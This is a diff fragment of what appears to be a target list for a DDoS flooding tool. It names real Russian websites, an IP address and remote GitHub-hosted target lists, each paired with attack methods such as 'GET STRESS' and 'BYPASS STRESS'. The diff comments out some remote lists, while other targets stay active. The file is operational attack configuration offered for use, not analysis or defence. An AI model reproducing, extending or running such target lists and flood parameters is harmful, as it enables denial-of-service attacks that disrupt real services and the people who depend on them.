@@ -90,12 +90,12 @@ https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.
 
 #-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
 
 https://www.a-3.ru/pay_gaz --http-methods GET STRESS
